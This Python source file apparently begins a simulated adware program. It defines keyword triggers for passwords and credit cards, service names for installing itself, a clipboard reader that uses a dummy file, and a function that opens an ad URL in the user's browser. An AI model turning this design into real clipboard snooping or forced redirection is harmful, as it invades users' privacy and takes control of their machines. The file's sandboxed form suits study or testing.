import os
import time
import logging
import argparse
import subprocess
import platform
from datetime import datetime

KEYWORDS = ['password', 'credit card']
LOG_FILE = './target/notification.log'
SERVICE_NAME_WINDOWS = 'AdwareService'
SERVICE_NAME_LINUX = 'adware'
DEFAULT_AD_URL = 'http://example.com'

def get_clipboard_data():
    try:
        # Simulate clipboard access using a dummy file
        clipboard_file = './target/clipboard.txt'
        os.makedirs(os.path.dirname(clipboard_file), exist_ok=True)
        if not os.path.exists(clipboard_file):
            with open(clipboard_file, 'w') as f:
                f.write('')
        with open(clipboard_file, 'r') as f:
            data = f.read()
    except Exception:
        data = ''
    return data

def redirect_browser(ad_url):
    try:
        if platform.system() == 'Windows':
            subprocess.Popen(['start', ad_url], shell=True)
        elif platform.system() == 'Linux':
            subprocess.Popen(['xdg-open', ad_url])
        else:
            logging.warning(f"Unsupported platform: {platform.system()}. Unable to redirect browser.")
    except Exception as e:
        logging.error(f"Failed to redirect browser to {ad_url}: {e}")

